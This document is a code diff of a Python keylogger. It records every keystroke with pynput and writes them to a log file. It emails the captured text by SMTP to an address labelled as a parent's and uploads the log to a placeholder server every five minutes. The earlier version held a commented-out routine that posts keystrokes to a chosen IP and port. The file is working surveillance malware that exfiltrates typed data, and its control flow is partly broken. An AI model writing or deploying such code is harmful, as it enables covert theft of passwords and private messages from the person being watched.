@@ -1,86 +1,124 @@
-from pynput import keyboard
-import json
-
 import requests
-import threading
+import time
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import tkinter as tk
 
-key_list = []
-x = False
-key_strokes = ""
+# File to store the captured keystrokes
+log_file = 'keylog.txt'
 
-#--------------------------USE THIS CODE FOR SENDING DATA REMOTELY--------------------------------
+# Email configuration
+smtp_server = 'smtp.example.com'
+smtp_port = 587
+smtp_username = 'your_email@example.com'
+smtp_password = 'your_email_password'
+email_from = 'your_email@example.com'
+email_to = 'parent_email@example.com'
+email_subject = 'Keylogger Data'
 
-# ip_address = "......" # enter your preferred ip address
-# port_number = "......"  # enter your preferred Port address
-# time_interval = 3600
+# Server configuration to send keystrokes
+server_url = 'https://your-server-url.com/upload'  # Replace with your server URL
+upload_interval = 300  # 5 minutes in seconds
 
-# def send_post_req():
-#     try:
-#         payload = json.dumps({"keyboardData": key_strokes})
-#         response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
-#         if response.status_code == 200:
-#             print("Data sent successfully!")
-#         else:
-#             print("Failed to send data. Status code:", response.status_code)
-#         timer = threading.Timer(time_interval, send_post_req)
-#         timer.start()
-#     except requests.exceptions.RequestException as e:
-#         print("An error occurred:", e)
+key_strokes = ''
 
-#------------------------------------------ END -----------------------------------------------------
+def send_email(message):
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = email_from
+        msg['To'] = email_to
+        msg['Subject'] = email_subject
 
-def update_json_file(key_list):
-    with open('adv_logs.json', '+wb') as key_log:
-        key_list_bytes = json.dumps(key_list).encode()
-        key_log.write(key_list_bytes)
+        msg.attach(MIMEText(message, 'plain'))
 
-def update_txt_file(key):
-    with open('adv_log.txt', 'w+') as key_strokes_file:
-        key_strokes_file.write(key)
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(smtp_username, smtp_password)
+        server.sendmail(email_from, email_to, msg.as_string())
+        server.quit()
 
+        print(f"Email sent successfully!")
+    except Exception as e:
+        print(f"Couldn't send email. Error: {e}")
 
+def send_to_server(filename):
+    try:
+        with open(filename, 'rb') as file:
+            response = requests.post(server_url, files={'file': file})
+        if response.status_code == 200:
+            print(f"File uploaded successfully! File: {filename}")
+        else:
+            print(f"Failed to upload file. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Couldn't upload file. Error: {e}")
+
+def write_to_file(content):
+    with open(log_file, 'a') as file:
+        file.write(content)
 
 def on_press(key):
-    global x, key_list, key_strokes
-    if x == False:
-        key_list.append({'Pressed': f'{key}'})
-        x = True
-    if x == True:
-        key_list.append({'Held': f'{key}'})
-
+    global key_strokes
 
     if key == keyboard.Key.enter:
         key_strokes += "\n"
+        write_to_file(key_strokes)
     elif key == keyboard.Key.tab:
         key_strokes += "\t"
+        write_to_file(key_strokes)
     elif key == keyboard.Key.space:
         key_strokes += " "
+        write_to_file(key_strokes)
     elif key == keyboard.Key.shift:
-        pass
-    elif key == keyboard.Key.backspace and len(key_strokes) == 0:
         pass
     elif key == keyboard.Key.backspace and len(key_strokes) > 0:
         key_strokes = key_strokes[:-1]
+        write_to_file(key_strokes)
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         pass
     elif key == keyboard.Key.esc:
+        send_email(key_strokes)
+        send_to_server(log_file)  # Send the log file to the server
+        window.quit()
         return False
     else:
         key_strokes += str(key).strip("'")
+        write_to_file(key_strokes)
 
-    update_json_file(key_list)
-    update_txt_file(key_strokes)
-
+    # Update the GUI display with the current key strokes
+    text_widget.configure(state='normal')
+    text_widget.insert(tk.END, key_strokes + '\n')
+    text_widget.configure(state='disabled')
+    text_widget.see(tk.END)
 
 def on_release(key):
-    global x, key_list, key_strokes
-    key_list.append({'Released': f'{key}'})
-    if x == True:
-        x = False
-    update_json_file(key_list)
+    pass
 
-# Start sending data at regular intervals
-# send_post_req()
+# Create the GUI window
+window = tk.Tk()
+window.title("Keylogger")
 
+# Create a scrollable text widget to display the captured keystrokes
+text_widget = tk.Text(window, font=("Courier", 12), width=40, height=10)
+text_widget.pack(padx=10, pady=10)
+scrollbar = tk.Scrollbar(window)
+scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+text_widget.config(yscrollcommand=scrollbar.set)
+scrollbar.config(command=text_widget.yview)
+
+# Start the keylogger
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    # Print a message to indicate that the keylogger is running
+    print("Keylogger started. Press Esc to send the log file and exit.")
+    
+    # Schedule sending the log file to the server every 5 minutes
+    while True:
+        try:
+            time.sleep(upload_interval)
+            send_to_server(log_file)
+        except Exception as e:
+            print(f"Failed to upload log file. Error: {e}")
+
+    # Run the GUI event loop
+    window.mainloop()
